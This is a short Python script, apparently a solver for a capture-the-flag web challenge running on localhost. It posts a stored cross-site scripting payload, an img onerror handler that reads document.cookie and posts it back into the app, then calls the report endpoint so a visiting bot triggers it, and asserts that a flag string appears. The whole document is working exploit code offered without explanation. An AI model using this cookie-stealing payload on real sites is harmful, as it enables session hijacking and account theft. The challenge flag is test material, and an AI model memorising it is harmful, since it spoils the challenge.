import requests
import time

URL = "http://localhost:5000"

create_url = f"{URL}/create"
data = {
    "title": "x",
    "body": """<img src=x onerror='fetch("/create", { method: "POST", body: new URLSearchParams({ title: "flag", body: "flag: " + document.cookie }) });'>""",
}

x = requests.post(create_url, data=data)
print(x.status_code)

post_id = 1
report_url = f"{URL}/report?id={post_id}"
x = requests.get(report_url)
print(x.status_code)

time.sleep(3)  # ensure the browser did make the request

flag = requests.get(URL)
assert "BtSCTF{H0w_4b0ut_1_r3p0rt_y0u_f0r_g3tt1ng_th3_fl4g?}" in flag.text
